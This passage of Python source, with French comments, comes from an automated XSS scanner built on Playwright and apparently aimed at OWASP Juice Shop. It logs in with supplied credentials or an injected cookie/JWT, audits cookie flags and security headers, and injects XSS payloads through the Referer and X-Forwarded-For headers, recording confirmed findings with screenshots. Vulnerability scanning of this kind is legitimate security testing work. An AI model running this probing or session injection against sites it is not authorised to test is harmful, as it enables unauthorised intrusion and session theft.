            # subordonnés à pwd_gone : un jeton de session qui apparaît
            # (absent avant la soumission, présent après) est une preuve
            # directe en soi, que la page ait ou non visuellement changé —
            # certains sites ne masquent/retirent pas le formulaire de
            # connexion après authentification (ex : formulaire encore
            # présent mais désactivé, ou simplement jamais retiré du DOM).
            if cookies_before is not None:
                try:
                    after = {c["name"] for c in await page.context.cookies()}
                except Exception:
                    after = set()
                new_cookies = after - cookies_before
                if _names_look_session_like(new_cookies):
                    return True

            if storage_before is not None:
                try:
                    keys_after = await page.evaluate(
                        "() => Object.keys(window.localStorage || {})"
                    )
                except Exception:
                    keys_after = []
                new_keys = set(keys_after) - storage_before
                if _names_look_session_like(new_keys):
                    return True

            await page.wait_for_timeout(300)
        return False

    async def _verify_logged_in_any(self, page: Page, timeout: int = 5000) -> bool:
        """Essaie la vérification précise (Juice Shop) puis, à défaut, la
        générique — utilisé quand la cible peut être un site quelconque
        (session fournie manuellement via cookie/JWT, voir _apply_manual_session)."""
        if await self._verify_logged_in(page, timeout=min(timeout, 3000)):
            return True
        return await self._verify_logged_in_generic(page, timeout=timeout)

    async def _inspect_session_bootstrap_response(
        self, response, signal: dict[str, bool],
    ) -> None:
        """
        Inspecte les réponses réseau qui suivent l'application d'une
        session manuelle (cookie/JWT) — voir `_apply_manual_session`.

        Contrairement à `_inspect_login_response` (qui cherche un jeton
        dans la réponse d'une SOUMISSION de formulaire), ici il n'y a pas
        de soumission : le signal recherché est que l'app ait VALIDÉ la
        session déjà fournie — typiquement un appel "utilisateur courant"
        au démarrage. Un 401/403 est une preuve fiable de rejet.

        Pour le succès, on exige une correspondance EXACTE d'un segment
        entier du chemin (ex : "/me", "/api/whoami") — PAS une simple
        sous-chaîne sur des préfixes génériques comme "/api/"/"/rest/" :
        constaté en pratique sur Juice Shop, où /rest/admin/application-
        version, /rest/languages ou /api/Challenges sont des endpoints
        PUBLICS non authentifiés qui partagent pourtant ce préfixe avec les
        endpoints réellement protégés — un simple `in` aurait (et a,
        avant ce correctif) produit un faux positif systématique.
        """
        try:
            req = response.request
            if req.resource_type not in ("xhr", "fetch"):
                return
            log = signal.setdefault("log", [])
            if len(log) < 15:  # borné : simple aide au diagnostic, pas un HAR complet
                log.append(f"{req.method} {req.url} -> {response.status}")
            if response.status in (401, 403):
                signal["failed"] = True
                return
            if response.status < 300:
                path = urlparse(req.url).path
                segments = {seg.lower() for seg in path.split("/") if seg}
                if segments & _SESSION_CHECK_URL_SEGMENTS:
                    signal["success"] = True
        except Exception:
            pass

    async def _capture_auth_debug_snapshot(
        self, page: Page, network_signal: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """
        Capture un instantané de diagnostic quand la vérification de
        connexion échoue — pour que l'échec soit CONSTATABLE dans le
        rapport plutôt qu'une simple hypothèse à deviner à distance.
        Montre exactement ce que le navigateur a vu : cookies présents,
        clés localStorage présentes, URL finale, capture d'écran, et les
        appels réseau observés (voir _inspect_login_response /
        _inspect_session_bootstrap_response).
        """
        snapshot: dict[str, Any] = {}
        try:
            cookies = await page.context.cookies()
            snapshot["cookies_present"] = sorted(c["name"] for c in cookies)
        except Exception:
            snapshot["cookies_present"] = []
        try:
            keys = await page.evaluate("() => Object.keys(window.localStorage || {})")
            snapshot["local_storage_keys"] = sorted(keys)
        except Exception:
            snapshot["local_storage_keys"] = []
        try:
            snapshot["final_url"] = page.url
        except Exception:
            snapshot["final_url"] = ""
        snapshot["network_log"] = (network_signal or {}).get("log", [])
        snapshot["screenshot"] = await self._snap(
            page, "Page state after the login attempt (verification did not confirm success)"
        )
        return snapshot

    async def _apply_manual_session(self, page: Page) -> None:
        """
        Utilise une session fournie manuellement dans l'UI (cookie et/ou
        JWT) au lieu du compte jetable auto-généré — utile pour scanner avec
        une VRAIE session déjà authentifiée (ex : récupérée via les devtools
        du navigateur) plutôt qu'un compte anonyme fraîchement créé.

        Le cookie est posé sur le contexte AVANT toute navigation (comme le
        ferait un navigateur qui rechargerait la page avec ce cookie déjà
        présent) ; le JWT est écrit dans localStorage APRÈS une première
        navigation vers l'origine, car localStorage est cloisonné par
        origine — impossible d'y écrire tant qu'aucune page de ce domaine
        n'a été chargée (on serait encore sur about:blank).
        """
        if self.auth_cookie:
            for name, value in _parse_cookie_string(self.auth_cookie):
                try:
                    await page.context.add_cookies(
                        [{"name": name, "value": value, "url": self.origin}]
                    )
                except Exception as exc:
                    logger.warning("Cookie manuel '%s' rejeté : %s", name, exc)

        # Écoute les appels API déclenchés par le rechargement qui suit :
        # signal plus direct que deviner depuis l'état visuel de la page
        # ensuite (voir _inspect_session_bootstrap_response).
        network_signal = {"success": False, "failed": False}
        response_handler = lambda resp: asyncio.ensure_future(
            self._inspect_session_bootstrap_response(resp, network_signal)
        )
        page.on("response", response_handler)

        try:
            await self._goto_resilient(page, self.origin)
            await page.wait_for_timeout(300)
            await self._dismiss_overlays(page)
        except Exception:
            pass

        if self.auth_jwt:
            self.result.auth_token = self.auth_jwt
            try:
                await page.evaluate(
                    "(t) => window.localStorage.setItem('token', t)", self.auth_jwt
                )
                # Recharge pour que l'app relise le token fraîchement écrit
                # et mette à jour son état d'authentification (menu compte,
                # etc.) — sans ça la vérification ci-dessous verrait
                # toujours l'état "déconnecté" de la navigation précédente.
                await self._goto_resilient(page, self.origin)
                await page.wait_for_timeout(500)
                await self._dismiss_overlays(page)
            except Exception as exc:
                logger.warning("Injection du JWT dans localStorage impossible : %s", exc)

        # Laisse le temps aux appels API déclenchés par le rendu de la page
        # de se terminer avant de couper l'écoute réseau.
        await page.wait_for_timeout(500)
        page.remove_listener("response", response_handler)

        # Contrairement à _login_with_credentials, on ne peut pas déduire la
        # réussite d'un clic "Connexion" : on combine donc la vérification
        # visuelle (_verify_logged_in_any, Juice Shop + générique) avec le
        # signal réseau ci-dessus — un 401/403 explicite prime sur tout
        # signal visuel potentiellement trompeur.
        dom_verified = await self._verify_logged_in_any(page, timeout=4000)
        verified = (dom_verified or network_signal["success"]) and not network_signal["failed"]

        self._logged_in = verified
        logger.info(
            "Session manuelle appliquée (cookie=%s, jwt=%s, vérifiée=%s)",
            bool(self.auth_cookie), bool(self.auth_jwt), verified,
        )
        note = "" if verified else (
            "The provided cookie/JWT was applied, but the target's UI did "
            "not visibly confirm an authenticated session (no account menu "
            "found) — the value may be invalid or expired, or this target "
            "doesn't expose the same logged-in indicators as Juice Shop."
        )
        await self._analyze_session(
            page, token_in_local_storage=bool(self.auth_jwt),
            logged_in=verified, auth_mode="manual_cookie_jwt", note=note,
        )
        if not verified:
            self.result.session_analysis["debug"] = await self._capture_auth_debug_snapshot(
                page, network_signal
            )

    async def _login_with_credentials(self, page: Page, email: str, password: str) -> None:
        """
        Connexion avec des identifiants RÉELS fournis par l'utilisateur (au
        lieu du compte jetable auto-généré par _register_and_login) — utile
        pour scanner avec un compte de test existant. Pas de tentative
        d'inscription ici : on suppose que le compte existe déjà.

        Deux stratégies essayées dans l'ordre, pour fonctionner aussi bien
        sur Juice Shop (la cible de démo) que sur un site quelconque dont
        on ne connaît pas la structure HTML à l'avance :
          1. Sélecteurs Juice Shop connus (rapide, précis).
          2. Détection générique d'un formulaire de connexion (champ mot
             de passe + champ identifiant le plus proche + bouton submit).
        """
        attempts: list[str] = []

        try:
            if await self._try_login_juiceshop_selectors(page, email, password):
                self._logged_in = True
                await self._finish_login_success(page, email, "manual_credentials")
                return
            attempts.append("no Juice Shop-style login form found")
        except Exception as exc:
            attempts.append(f"Juice Shop-style attempt: {_short_reason(exc)}")

        try:
            if await self._try_login_generic(page, email, password):
                self._logged_in = True
                await self._finish_login_success(page, email, "manual_credentials")
                return
            attempts.append("no login form (password field) found on this page")
        except Exception as exc:
            attempts.append(f"generic attempt: {_short_reason(exc)}")

        reason = "; ".join(attempts)
        logger.warning("Connexion avec les identifiants fournis a échoué : %s", reason)
        self.result.session_analysis = {
            "logged_in": False,
            "auth_mode": "manual_credentials",
            "cookies": [],
            "token_in_local_storage": False,
            "findings": [],
            "note": (
                f"Login with the provided username/password ({email}) did "
                "not succeed — check that this account exists on the "
                f"target and the password is correct. (Detail: {reason})"
            ),
        }
        self.result.session_analysis["debug"] = await self._capture_auth_debug_snapshot(page)

    async def _try_login_juiceshop_selectors(
        self, page: Page, email: str, password: str
    ) -> bool:
        """
        Tentative rapide avec les sélecteurs fixes de Juice Shop. Renvoie
        `False` (sans lever) si le formulaire n'a pas cette structure —
        auquel cas `_login_with_credentials` passe à la détection
        générique plutôt que d'abandonner.
        """
        await self._goto_resilient(page, f"{self.origin}/#/login")
        await page.wait_for_timeout(500)
        await self._dismiss_overlays(page)
        try:
            await page.wait_for_selector("#email", timeout=3000)
        except Exception:
            return False  # pas un formulaire Juice Shop -> tentative générique

        await page.fill("#email", email)
        await page.fill("#password", password)
        await page.click("#loginButton", timeout=5000)
        await page.wait_for_timeout(1200)
        if not await self._verify_logged_in(page, timeout=5000):
            raise RuntimeError(
                "Login form submitted but no authenticated session was "
                "detected afterwards (wrong password or account does not "
                "exist on this target)."
            )
        return True

    async def _inspect_login_response(self, response, signal: dict[str, bool]) -> None:
        """
        Inspecte une réponse réseau survenue pendant `_try_login_generic`
        pour y chercher le verdict de l'API de connexion elle-même — le
        signal le plus direct possible, plutôt qu'une déduction depuis
        l'état du DOM ensuite (voir _try_login_generic).

        - Statut 401/403 sur un appel XHR/fetch : échec explicite, quel que
          soit ce que montre la page ensuite.
        - Corps JSON/texte contenant une clé de jeton typique
          (token/access_token/jwt/authToken/sessionId) : succès — la
          quasi-totalité des API de connexion renvoient soit ça, soit un
          cookie de session (déjà couvert par `cookies_before` dans
          `_verify_logged_in_generic`).
        """
        try:
            req = response.request
            if req.resource_type not in ("xhr", "fetch", "document"):
                return
            if response.status in (401, 403):
                signal["failed"] = True
                return
            if response.status >= 400:
                return
            headers = response.headers or {}
            ctype = headers.get("content-type", "")
            if "json" not in ctype and "text" not in ctype:
                return
            body = (await response.text()).lower()
            if any(
                kw in body for kw in
                ('"token"', '"access_token"', '"accesstoken"', '"jwt"',
                 '"authtoken"', '"sessionid"', '"session_id"')
            ):
                signal["success"] = True
        except Exception:
            pass

    async def _try_login_generic(self, page: Page, email: str, password: str) -> bool:
        """
        Détection générique d'un formulaire de connexion, pour un site dont
        la structure HTML n'est pas connue à l'avance : repère un champ mot
        de passe (sélecteur quasi universel, `type="password"`), remonte au
        champ identifiant le plus proche dans le même `<form>`, et soumet
        via le bouton le plus probable. Moins fiable que les sélecteurs
        dédiés Juice Shop (voir `_verify_logged_in_generic`), mais permet de
        scanner un site quelconque plutôt que seulement la cible de démo.
        """
        await self._goto_resilient(page, self.target)
        await page.wait_for_timeout(500)
        await self._dismiss_overlays(page)

        pwd_field = await page.query_selector("input[type='password']")
        if not pwd_field:
            # Le formulaire est peut-être caché derrière un lien "Log in" /
            # "Sign in" plutôt que visible directement sur la page cible.
            for sel in (
                "a:has-text('Log in')", "a:has-text('Sign in')", "a:has-text('Login')",
                "button:has-text('Log in')", "button:has-text('Sign in')",
                "a[href*='login' i]", "a[href*='signin' i]", "a[href*='sign-in' i]",
            ):
                try:
                    el = await page.query_selector(sel)
                    if el and await el.is_visible():
                        await el.click(timeout=2000, force=True)
                        await page.wait_for_timeout(800)
                        break
                except Exception:
                    continue
            pwd_field = await page.query_selector("input[type='password']")

        if not pwd_field:
            return False  # aucun formulaire de connexion détectable

        user_handle = await page.evaluate_handle(
            """(pwd) => {
                const form = pwd.closest('form') || document;
                const sel = 'input[type="email"], input[autocomplete="username"], ' +
                    'input[autocomplete="email"], input[name*="email" i], ' +
                    'input[name*="user" i], input[id*="email" i], input[id*="user" i], ' +
                    'input[type="text"]';
                const candidates = [...form.querySelectorAll(sel)];
                return candidates.find(el => el.offsetParent !== null) || candidates[0] || null;
            }""",
            pwd_field,
        )
        user_el = user_handle.as_element()
        if not user_el:
            raise RuntimeError(
                "Password field found, but no username/email field near it."
            )

        # Capturés AVANT la soumission : un nouveau cookie/clé localStorage
        # au nom évocateur d'une session apparu APRÈS est un signal de
        # secours pour _verify_logged_in_generic quand aucun indice textuel
        # de déconnexion n'est détectable sur ce site (voir cette méthode).
        try:
            cookies_before = {c["name"] for c in await page.context.cookies()}
        except Exception:
            cookies_before = set()
        try:
            storage_before = set(
                await page.evaluate("() => Object.keys(window.localStorage || {})")
            )
        except Exception:
            storage_before = set()

        # Signal le plus direct de tous : ce que l'API de connexion elle-même
        # répond — plutôt que de deviner depuis l'état du DOM ensuite. La
        # quasi-totalité des flux de connexion web renvoient soit un cookie
        # de session (Set-Cookie, déjà couvert par cookies_before), soit un
        # jeton dans le corps JSON de la réponse (consommé par le JS du
        # site puis stocké en local/sessionStorage) ; un 401/403 explicite
        # est à l'inverse une preuve fiable d'échec, quel que soit l'état du
        # DOM ensuite (qui peut prêter à confusion sur une SPA).
        network_signal = {"success": False, "failed": False}
        response_handler = lambda resp: asyncio.ensure_future(
            self._inspect_login_response(resp, network_signal)
        )
        page.on("response", response_handler)

        await user_el.fill(email)
        await pwd_field.fill(password)

        submitted = False
        for sel in (
            "button[type='submit']", "input[type='submit']",
            "button:has-text('Log in')", "button:has-text('Sign in')",
            "button:has-text('Login')", "button:has-text('Sign On')",
        ):
            try:
                btn = await page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click(timeout=2000, force=True)
                    submitted = True
                    break
            except Exception:
                continue
        if not submitted:
            await pwd_field.press("Enter")

        await page.wait_for_timeout(1500)
        page.remove_listener("response", response_handler)

        dom_verified = await self._verify_logged_in_generic(
            page, timeout=5000, cookies_before=cookies_before,
            storage_before=storage_before,
        )
        # Le 401/403 explicite prime sur tout signal DOM potentiellement
        # trompeur (ex : une page d'erreur générique qui n'affiche plus le
        # champ mot de passe sans pour autant avoir authentifié qui que ce
        # soit).
        verified = (dom_verified or network_signal["success"]) and not network_signal["failed"]

        if not verified:
            raise RuntimeError(
                "Login form submitted but no authenticated session was "
                "detected afterwards (wrong password, account doesn't "
                "exist, or this site's logged-in state couldn't be "
                "confirmed automatically)."
            )
        return True

    async def _finish_login_success(self, page: Page, email: str, auth_mode: str) -> None:
        token = None
        try:
            token = await page.evaluate("window.localStorage.getItem('token')")
            if token:
                self.result.auth_token = token
        except Exception:
            pass
        logger.info("Connecté avec les identifiants fournis (%s)", email)
        await self._analyze_session(
            page, token_in_local_storage=bool(token), auth_mode=auth_mode,
        )

    async def _register_and_login(self, page: Page) -> None:
        """
        Crée un compte jetable et se connecte AVANT le crawl BFS (jusqu'à 2
        tentatives, avec des identifiants regénérés à chaque essai pour
        éviter un conflit si la 1re tentative s'est arrêtée après
        l'inscription mais avant la connexion).

        Beaucoup de vulnérabilités XSS de Juice Shop (profil utilisateur,
        feedback avec auteur pré-rempli, menu compte étendu...) ne sont
        atteignables qu'après authentification : sans session, ces pages
        n'apparaissent jamais dans le graphe de liens exploré par le crawler.
        Best-effort : si le site cible n'a pas ce formulaire (sélecteurs
        introuvables), on abandonne et le crawl continue en mode anonyme.
        """
        for attempt in range(1, 3):
            if self._paused():
                return
            self._login_email, self._login_password = _random_credentials()
            try:
                if await self._try_register_and_login(page):
                    return
                reason = "formulaire d'inscription/connexion non reconnu"
            except Exception as exc:
                reason = str(exc)
            logger.warning(
                "Login pré-crawl : échec à l'essai %d/2 (%s) — %s",
                attempt, reason, "nouvel essai" if attempt == 1 else "abandon, mode anonyme",
            )

    async def _try_register_and_login(self, page: Page) -> bool:
        """Une tentative d'inscription + connexion. Renvoie False si le site
        cible ne présente pas ce formulaire (pas une erreur, cible différente)."""
        await self._goto_resilient(page, f"{self.origin}/#/register")
        await page.wait_for_timeout(500)
        await self._dismiss_overlays(page)

        try:
            await page.wait_for_selector("#emailControl", timeout=6000)
        except PWTimeout:
            return False  # Pas de formulaire d'inscription reconnu -> abandon.

        await page.fill("#emailControl", self._login_email)
        await page.fill("#passwordControl", self._login_password)
        await page.fill("#repeatPasswordControl", self._login_password)
        try:
            # `force=True` : le <mat-label> flottant d'Angular Material
            # (placeholder "Security Question") chevauche la zone cliquable
            # du <mat-select> et intercepte les événements pointeur d'un clic
            # normal, qui timeout alors sans jamais ouvrir le menu — le champ
            # reste vide et le formulaire (donc #registerButton) reste
            # invalide indéfiniment. `force` ignore cette vérification
            # d'interception et clique directement aux coordonnées de
            # l'élément, ce que confirme un utilisateur réel qui cliquerait
            # au même endroit sans jamais remarquer le chevauchement visuel.
            await page.click("#mat-select-0", timeout=3000, force=True)
            await page.wait_for_timeout(200)
            await page.click("mat-option >> nth=0", timeout=3000, force=True)
        except Exception:
            pass
        security_answer = await page.query_selector("#securityAnswerControl")
        if security_answer:
            await page.fill("#securityAnswerControl", "scanner")
        await page.click("#registerButton", timeout=5000)
        await page.wait_for_timeout(1200)

        await self._goto_resilient(page, f"{self.origin}/#/login")
        await page.wait_for_timeout(500)
        await self._dismiss_overlays(page)
        try:
            await page.wait_for_selector("#email", timeout=6000)
        except PWTimeout:
            return False
        await page.fill("#email", self._login_email)
        await page.fill("#password", self._login_password)
        await page.click("#loginButton", timeout=5000)
        await page.wait_for_timeout(1200)

        # Le menu compte n'expose pas toujours un <a href> classique pour
        # le profil (navigation programmatique) : on ajoute son URL
        # directement comme point d'entrée supplémentaire du crawl.
        if not await self._verify_logged_in(page, timeout=5000):
            return False

        self._logged_in = True
        token = None
        try:
            token = await page.evaluate("window.localStorage.getItem('token')")
            if token:
                self.result.auth_token = token
        except Exception:
            pass
        logger.info("Connecté avec le compte jetable %s", self._login_email)
        await self._analyze_session(page, token_in_local_storage=bool(token))
        return True

    async def _analyze_session(
        self, page: Page, token_in_local_storage: bool,
        logged_in: bool = True, auth_mode: str = "auto", note: str = "",
    ) -> None:
        """
        Audit de sécurité de la session tout juste établie — PAS une
        recherche de XSS, mais une inspection des attributs qui déterminent
        l'IMPACT d'un XSS trouvé ailleurs sur le site : un cookie de session
        sans HttpOnly, ou un jeton exposé en localStorage, transforme
        n'importe quelle injection XSS confirmée en vol de session trivial
        (`document.cookie` / `localStorage.getItem(...)` dans le payload).

        `auth_mode`/`note` tracent COMMENT la session a été établie (compte
        jetable auto / identifiants fournis / cookie-JWT fourni) et POURQUOI
        `logged_in` est faux le cas échéant — sans ça, un échec de connexion
        avec des identifiants fournis par l'utilisateur se rapportait
        silencieusement comme "aucune session", sans indiquer qu'il s'agit
        justement d'un ÉCHEC des identifiants saisis (compte inexistant sur
        la cible, mauvais mot de passe...).
        """
        try:
            raw_cookies = await page.context.cookies()
        except Exception:
            raw_cookies = []

        cookies: list[dict[str, Any]] = []
        findings: list[dict[str, str]] = []

        for c in raw_cookies:
            name = c.get("name", "")
            http_only = bool(c.get("httpOnly"))
            secure = bool(c.get("secure"))
            same_site = c.get("sameSite") or "None"
            expires = c.get("expires")
            is_session_cookie = expires is None or expires == -1

            issues: list[str] = []
            if not http_only:
                issues.append(
                    "Missing HttpOnly: readable via document.cookie by any "
                    "injected script — an XSS anywhere on the site can "
                    "exfiltrate this cookie."
                )
            if not secure:
                issues.append(
                    "Missing Secure: sent over plain HTTP too, not just "
                    "HTTPS — interceptable on an insecure network."
                )
            if same_site not in ("Strict", "Lax"):
                issues.append(
                    f"SameSite={same_site}: still sent on cross-site "
                    "requests, weakening CSRF protection."
                )
            if not is_session_cookie:
                issues.append(
                    "Persistent (long-lived) cookie rather than a session "
                    "cookie: a stolen value stays valid long after the "
                    "browser closes."
                )

            cookies.append({
                "name": name,
                "domain": c.get("domain", ""),
                "path": c.get("path", ""),
                "http_only": http_only,
                "secure": secure,
                "same_site": same_site,
                "session_cookie": is_session_cookie,
                "issues": issues,
            })
            for issue in issues:
                findings.append({"cookie": name, "issue": issue})

        if token_in_local_storage:
            findings.append({
                "cookie": "localStorage['token']",
                "issue": (
                    "Session token stored in localStorage (JWT), not in an "
                    "HttpOnly cookie: directly readable via JavaScript "
                    "(localStorage.getItem('token')). Any XSS elsewhere on "
                    "the site — including ones this scan may confirm — can "
                    "read and exfiltrate it for a full session takeover, no "
                    "additional vulnerability needed."
                ),
            })

        self.result.session_analysis = {
            "logged_in": logged_in,
            "auth_mode": auth_mode,
            "cookies": cookies,
            "token_in_local_storage": token_in_local_storage,
            "findings": findings,
            "note": note,
        }

    async def _analyze_security_headers(self, response) -> None:
        """
        Audit des en-têtes HTTP de sécurité de la réponse principale — PAS
        une recherche de XSS, mais ce qui détermine si le NAVIGATEUR a un
        filet de sécurité (CSP en tête) même quand une injection XSS est
        confirmée ailleurs dans ce rapport. Une CSP stricte peut bloquer
        l'exécution d'un payload malgré une faille d'échappement côté
        serveur ; son absence (ou une CSP permissive avec 'unsafe-inline')
        retire ce filet — c'est exactement pour ça que la plupart des
        preuves de ce rapport (alert() déclenché) fonctionnent.
        """
        try:
            headers = response.headers if response else {}
        except Exception:
            headers = {}

        findings: list[dict[str, str]] = []
        csp = headers.get("content-security-policy")
        csp_report_only_value = headers.get("content-security-policy-report-only")
        csp_report_only = not csp and bool(csp_report_only_value)
        effective_csp = csp or csp_report_only_value

        if not effective_csp:
            findings.append({
                "header": "Content-Security-Policy",
                "severity": "High",
                "issue": (
                    "Missing entirely — the browser has no policy "
                    "restricting what scripts can run, so a successful XSS "
                    "payload executes with no additional mitigation."
                ),
            })
        else:
            directives = _parse_csp(effective_csp)
            script_src = directives.get("script-src") or directives.get("default-src") or []
            if not script_src:
                findings.append({
                    "header": "Content-Security-Policy", "severity": "High",
                    "issue": "No script-src or default-src directive — script execution is unrestricted.",
                })
            else:
                if "'unsafe-inline'" in script_src:
                    findings.append({
                        "header": "Content-Security-Policy", "severity": "High",
                        "issue": (
                            "script-src allows 'unsafe-inline' — inline "
                            "<script> tags and on*= handlers run freely, "
                            "defeating CSP's main XSS mitigation (most "
                            "confirmed findings in this report rely on "
                            "exactly this vector)."
                        ),
                    })
                if "'unsafe-eval'" in script_src:
                    findings.append({
                        "header": "Content-Security-Policy", "severity": "Medium",
                        "issue": "script-src allows 'unsafe-eval' — eval()/Function()-based payloads can still execute.",
                    })
                if "*" in script_src or any(s in ("http:", "https:") for s in script_src):
                    findings.append({
                        "header": "Content-Security-Policy", "severity": "Medium",
                        "issue": (
                            "script-src allows scripts from any host "
                            "(wildcard or broad scheme) — an attacker-"
                            "controlled or compromised third-party script "
                            "can be loaded."
                        ),
                    })
            if "object-src" not in directives:
                findings.append({
                    "header": "Content-Security-Policy", "severity": "Low",
                    "issue": "No object-src directive — legacy plugin-based vectors (Flash/Java applets) aren't restricted.",
                })
            if "base-uri" not in directives:
                findings.append({
                    "header": "Content-Security-Policy", "severity": "Low",
                    "issue": "No base-uri directive — a <base> tag injection could redirect relative script/asset URLs to an attacker's host.",
                })
            if csp_report_only:
                findings.append({
                    "header": "Content-Security-Policy", "severity": "Medium",
                    "issue": "Only Content-Security-Policy-Report-Only is set — the policy is monitored but NOT enforced; nothing is actually blocked.",
                })

        if not headers.get("x-frame-options") and "frame-ancestors" not in (effective_csp or ""):
            findings.append({
                "header": "X-Frame-Options", "severity": "Low",
                "issue": "Missing (and no CSP frame-ancestors) — the page can be framed by another site (clickjacking).",
            })
        if (headers.get("x-content-type-options") or "").lower() != "nosniff":
            findings.append({
                "header": "X-Content-Type-Options", "severity": "Low",
                "issue": "Missing 'nosniff' — browsers may MIME-sniff a response into an executable content type.",
            })
        if self.origin.startswith("https://") and not headers.get("strict-transport-security"):
            findings.append({
                "header": "Strict-Transport-Security", "severity": "Low",
                "issue": "Missing on an HTTPS site — no protection against protocol downgrade to plain HTTP.",
            })

        self.result.security_headers = {
            "checked_url": response.url if response else self.target,
            "csp_present": bool(csp),
            "csp_enforced": bool(csp),
            "raw_csp": effective_csp or "",
            "findings": findings,
        }

    async def _probe_header_xss(self, browser) -> None:
        """
        Sonde XSS via des en-têtes HTTP réfléchis (Referer, X-Forwarded-For)
        — vecteur distinct de _probe_dom_xss/_probe_reflected_xss : certaines
        pages (erreurs, logs applicatifs affichés, bannières "provenance
        détectée") reflètent ces en-têtes sans échappement ; ni XSStrike ni
        DalFox ne testent ce vecteur (ils ne fuzzent que l'URL/le corps).
        Budget dédié et borné : chaque essai ouvre un nouveau contexte
        navigateur (coûteux), contrairement aux autres sondages qui
        réutilisent la même page.
        """
        if self._header_probe_budget <= 0:
            return

        for header_name in ("Referer", "X-Forwarded-For"):
            for payload in HEADER_XSS_PAYLOADS:
                if self._header_probe_budget <= 0 or self._paused():
                    return
                self._header_probe_budget -= 1

                ctx = None
                try:
                    ctx = await browser.new_context(
                        ignore_https_errors=True,
                        extra_http_headers={header_name: payload},
                    )
                    hpage = await ctx.new_page()
                    self._dialog_fired = False
                    hpage.on("dialog", lambda d: asyncio.ensure_future(self._on_dialog(d)))
                    await hpage.goto(
                        self.target, timeout=config.CRAWLER_PAGE_TIMEOUT_MS,
                        wait_until="domcontentloaded",
                    )
                    await hpage.wait_for_timeout(1000)

                    if self._dialog_fired:
                        shot = await self._snap(
                            hpage, f"HTTP header '{header_name}' reflected and executed"
                        )
                        await self._record_finding(
                            hpage, self.target, payload, header_name,
                            "Header XSS",
                            f"Payload sent in the HTTP '{header_name}' request "
                            "header and executed by the page's JS rendering "
                            "(alert() fired).",
                            source=f"HTTP request header '{header_name}' "
                                   "(sent directly by the client, not via URL/form)",
                            extra_shots=[shot] if shot else None,
                        )
                except Exception as exc:
                    logger.debug("Sondage en-tête %s échoué : %s", header_name, exc)
                finally:
                    if ctx:
                        try:
                            await ctx.close()
                        except Exception:
                            pass

    async def _trigger_search_inputs(self, page: Page) -> None:
        """
        Tente de révéler puis d'utiliser une barre de recherche.

        De nombreuses SPA (Juice Shop compris) cachent le champ de recherche
        derrière une icône, et l'appel API qui nous intéresse n'est déclenché
        qu'après une frappe utilisateur. On simule cette interaction pour
        provoquer l'appel réseau capturé par `_on_request`.
        """
        try:
            for sel in ("[aria-label*='search' i]", "button[mat-icon-button]"):
                try:
                    el = await page.query_selector(sel)
                    if el:
                        await el.click(timeout=1000)
                        await page.wait_for_timeout(300)
                except Exception:
                    continue

            inputs = await page.query_selector_all(
                "input[type='search'], input[type='text'], "
                "input[name*='search' i], input[id*='search' i]"
            )
            for inp in inputs[:3]:
                try:
                    await inp.fill("xsstrike")
                    await inp.press("Enter")
                    await page.wait_for_timeout(600)
                except Exception:
                    continue
        except Exception:
            pass

    @staticmethod
    async def _snap(page: Page, label: str) -> dict[str, str] | None:
        """Capture un screenshot labellisé (best-effort, jamais bloquant)."""
        try:
            raw = await page.screenshot(full_page=False)
        except Exception:
            return None
        return {"label": label, "image_b64": base64.b64encode(raw).decode("ascii")}

    @staticmethod
    async def _annotate_confirmed(page: Page) -> None:
        """
        Incruste un bandeau visuel avant la capture "résultat".

        Un dialogue JS natif (alert/confirm/prompt) — la preuve d'exécution
        elle-même — n'apparaît JAMAIS sur une capture d'écran Playwright
        (c'est un élément de chrome du navigateur, pas du contenu de la
        page) : sans ce bandeau, la capture "résultat" ressemblerait
        souvent trait pour trait à la capture "avant", ce qui ne prouve
        visuellement rien. Cette annotation est ajoutée APRÈS coup par
        l'outil pour illustrer le rapport ; elle ne fait pas partie du
        payload testé (qui reste inchangé, voir le champ "payload").
        """
        try:
            await page.evaluate(
                """() => {
                    const id = '__xss_poc_confirmed_banner__';
                    if (document.getElementById(id)) return;
                    const b = document.createElement('div');
                    b.id = id;
                    b.textContent = '✅ XSS CONFIRMED — a JS dialog '
                        + '(alert/confirm/prompt) just fired here. Native browser dialogs '
                        + 'cannot appear in a screenshot: this banner, added by the tool '
                        + 'afterwards, marks the moment of execution.';
                    b.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;'
                        + 'background:#c0392b;color:#fff;font:bold 13px/1.5 sans-serif;'
                        + 'padding:10px 18px;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,.5);';
                    (document.body || document.documentElement).appendChild(b);
                }"""
            )
        except Exception:
            pass

    async def _record_finding(
        self, page: Page, base_url: str, payload: str, parameter: str,
        vuln_type: str, note: str, source: str = "",
        extra_shots: list[dict[str, str]] | None = None,
    ) -> None:
        """
        Factorise l'enregistrement d'une découverte XSS confirmée par exécution.

        `extra_shots` : captures déjà prises par l'appelant AVANT ce point
        (ex : page avant injection, champ rempli avec le payload visible) —
        on y ajoute systématiquement une dernière capture "résultat" prise
        ici, pour obtenir une séquence complète avant/injection/résultat
        plutôt qu'une unique image de la fin.
        """
        # Le même sondage (ex : recherche) s'exécute sur chaque page visitée
        # (barre de recherche présente partout) : sans dédoublonnage, une
        # unique vulnérabilité apparaîtrait une fois par page dans le
        # rapport. On ne garde qu'une occurrence par (type, url, paramètre,
        # payload) — contrairement à `parse_scan_results`, ce dédoublonnage
        # ne s'applique qu'aux découvertes du crawler, faites AVANT le
        # merge avec les résultats XSStrike/DalFox dans app.py.
        dedup_key = (vuln_type, base_url, parameter, payload)
        if dedup_key in self._finding_keys:
            return
        self._finding_keys.add(dedup_key)

        screenshots = list(extra_shots or [])
        await self._annotate_confirmed(page)
        result_shot = await self._snap(page, "Result (confirmed execution — banner added by the tool)")
        if result_shot:
            screenshots.append(result_shot)

        sink = await _identify_sink(page, vuln_type)
        self.result.dom_xss_findings.append({
            "tool": "playwright-dom-probe",
            "type": vuln_type,
            "severity": "Critical",
            "url": base_url,
            "parameter": parameter,
            "payload": payload,
            "context": "DOM — client-side rendering (SPA)",
            "source": source or f"Field/parameter '{parameter}'",
            "sink": sink,
            "evidence": "JS dialog triggered in a real browser",
            "confidence": "high",
            "cwe": "CWE-79",
            "confirmed": True,
            "screenshot_b64": screenshots[-1]["image_b64"] if screenshots else "",
            "screenshots": screenshots,
            "verification_note": note,
            "reproduction_url": page.url if page.url else "",
            "reproduction_steps": [
                f"Source: {source or f'field/parameter {parameter!r}'} — this "
                "is where attacker-controlled data enters the application.",
